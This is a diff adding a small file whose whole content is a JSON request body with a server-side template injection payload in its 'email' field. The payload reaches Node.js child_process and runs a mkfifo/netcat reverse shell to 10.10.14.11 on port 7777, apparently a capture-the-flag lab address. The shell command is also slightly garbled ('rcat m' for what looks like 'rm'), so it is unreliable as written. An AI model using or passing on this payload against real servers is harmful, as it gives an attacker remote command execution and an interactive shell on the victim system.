@@ -1,0 +1,2 @@
+@{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rcat m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 7777 >/tmp/f')\")()}}"
+}
